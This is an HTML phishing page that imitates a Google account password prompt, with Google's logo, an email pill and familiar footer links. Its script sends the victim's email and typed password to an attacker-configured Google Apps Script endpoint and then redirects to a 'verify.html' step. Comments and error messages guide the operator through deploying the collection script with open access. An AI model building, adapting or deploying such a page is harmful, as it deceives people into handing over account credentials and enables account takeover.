<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Sign in</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <div class="page-center">
    <div class="card">
      <div class="logo">
        <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
          <path fill="#EA4335" d="M24 9.5c3.54 0 6.14 1.53 7.56 2.8l5.5-5.5C33.64 3.6 29.22 1.5 24 1.5 14.98 1.5 7.2 6.68 3.44 14.24l6.66 5.18C11.84 13.3 17.42 9.5 24 9.5z"/>
          <path fill="#4285F4" d="M46.14 24.5c0-1.57-.14-3.08-.4-4.5H24v8.52h12.44c-.54 2.9-2.2 5.36-4.66 7.04l7.2 5.6c4.2-3.88 6.6-9.6 6.6-16.66z"/>
          <path fill="#FBBC05" d="M10.1 28.58c-.48-1.42-.76-2.94-.76-4.58s.28-3.16.76-4.58l-6.66-5.18C1.78 17.1.9 20.46.9 24s.88 6.9 2.54 9.76l6.66-5.18z"/>
          <path fill="#34A853" d="M24 46.5c6.48 0 11.92-2.14 15.9-5.84l-7.2-5.6c-2 1.34-4.56 2.14-8.7 2.14-6.58 0-12.16-3.8-13.9-9.02l-6.66 5.18C7.2 41.32 14.98 46.5 24 46.5z"/>
        </svg>
      </div>
      <div class="account-selector">
        <div class="avatar-circle" id="avatar"></div>
        <div class="email-pill">
          <span id="userEmailDisplay"></span>
          <span class="dropdown-arrow">▼</span>
        </div>
      </div>
      <h1>Welcome</h1>
      <p class="subtitle">Enter your password</p>
      <form>
        <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password" required autofocus>
        <div class="error-message" id="passError"></div>
        <a href="#" class="link">Forgot password?</a>
        <div class="actions">
          <button type="button" class="primary" onclick="submitPass()">Next</button>
        </div>
      </form>
    </div>
  </div>
  <footer class="footer">
    <div class="lang-select">English (United States) ▼</div>
    <div class="footer-links">Help · Privacy · Terms</div>
  </footer>

  <script>
    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxxwtqSxcM3xKDVY4vaXQ1E44cosqIVI9HM0guLL8GHe2hEV3S9EmQ1Pr46jzWZa9zS/exec"; // ← REPLACE WITH YOUR REAL /exec URL

    const email = (localStorage.getItem("demoEmail") || "someone@example.com").trim();
    document.getElementById("userEmailDisplay").textContent = email;
    const usernamePart = email.split('@')[0];
    const initial = usernamePart.charAt(0).toUpperCase();
    document.getElementById("avatar").textContent = initial;

    function submitPass() {
      const password = document.getElementById("password").value.trim();
      const error = document.getElementById("passError");
      error.textContent = "";
      error.style.color = "red";

      if (!password) {
        error.textContent = "Enter a password";
        return;
      }

      const params = new URLSearchParams();
      params.append("action", "submit_password");
      params.append("email", email);
      params.append("password", password);

      console.log("Submitting to:", SCRIPT_URL);
      console.log("Payload:", params.toString());

      fetch(SCRIPT_URL, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: params,
        mode: "cors",
        redirect: "follow"
      })
      .then(response => {
        console.log("Response status:", response.status);
        if (!response.ok) {
          throw new Error(`HTTP error ${response.status}`);
        }
        return response.json();
      })
      .then(data => {
        console.log("Success response:", data);
        if (data.success) {
          window.location.href = "verify.html";
        } else {
          error.textContent = data.error || "Failed to save. Try again.";
        }
      })
      .catch(err => {
        console.error("Fetch failed:", err);
        console.log("Error name:", err.name);
        console.log("Error message:", err.message);

        let msg = "Network error. Please try again.";
        if (err.name === "TypeError" && err.message.includes("fetch")) {
          msg = "Connection failed – check internet, URL, or script deployment";
        } else if (err.message.includes("CORS")) {
          msg = "CORS blocked – redeploy script with 'Who has access: Anyone'";
        } else if (err.message.includes("403") || err.message.includes("401")) {
          msg = "Permission denied – redeploy with 'Anyone' access";
        }

        error.textContent = msg;
        error.style.color = "red";
      });
    }
  </script>
</body>
</html>
